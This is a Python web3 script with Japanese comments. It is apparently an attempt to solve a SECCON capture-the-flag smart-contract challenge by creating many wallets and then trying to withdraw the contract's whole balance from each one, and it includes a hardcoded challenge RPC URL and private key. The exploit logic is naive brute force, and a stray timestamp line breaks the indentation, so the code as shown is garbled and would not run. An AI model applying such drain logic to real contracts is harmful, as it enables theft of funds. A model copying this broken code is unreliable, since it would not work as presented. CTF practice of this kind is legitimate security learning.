from web3 import Web3
import random
# RPCエンドポイントとプライベートキー
rpc_endpoint = 'http://trillion-ether.seccon.games:8545/ffcfceae-5b6c-4062-a0d7-b1623b0f2f1e'
private_key = 'a2a2eeb0a895a45ea6814efe279b49023f5b0419721d92d5e565a93cae8e9c9b'
challenge_contract_address = '0x0c690Ec281446a76494e8eF684ADDb8f357447d9'
# コントラクトのABI
abi = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "fromWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "toWalletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "walletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "wallets",
        "outputs": [
            {
                "components": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "internalType": "struct TrillionEther.Wallet[]",
                "name": "",
                "type": "tuple[]"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]
# Web3の初期化
w3 = Web3(Web3.HTTPProvider(rpc_endpoint))
account = w3.eth.account.from_key(private_key)
contract = w3.eth.contract(address=challenge_contract_address, abi=abi)
def exploit():
    # 無作為に大量のウォレットを作成し、不正なウォレットを見つける。
    for _ in range(100):  # ここでは100回試行（任意に変更可能）
        # 新しいウォレットを書き込み、ランダムなデータを使用
        random_name = random.getrandbits(256).to_bytes(32, 'big')
        tx = contract.functions.createWallet(random_name).build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 500000,
            'gasPrice': w3.to_wei('2', 'gwei'),
            'value': 0
        })
        signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
19:53
w3.eth.wait_for_transaction_receipt(tx_hash)
    # withdraw試行
    contract_balance = w3.eth.get_balance(challenge_contract_address)
    for wallet_id in range(len(contract.functions.wallets().call())):
        try:
            tx = contract.functions.withdraw(wallet_id, contract_balance).build_transaction({
                'from': account.address,
                'nonce': w3.eth.get_transaction_count(account.address),
                'gas': 500000,
                'gasPrice': w3.to_wei('2', 'gwei'),
            })
            signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            w3.eth.wait_for_transaction_receipt(tx_hash)
            print(f"Attempted withdraw from wallet_id: {wallet_id}")
        except Exception as e:
            # エラーハンドリング、何らかのエラーが発生した場合でも続く実行が可能
            print(f"Error withdrawing from wallet_id {wallet_id}: {e}")
    # 最終確認
    solved = contract.functions.isSolved().call()
    print(f"isSolved() = {solved}")
if __name__ == '__main__':
    exploit()
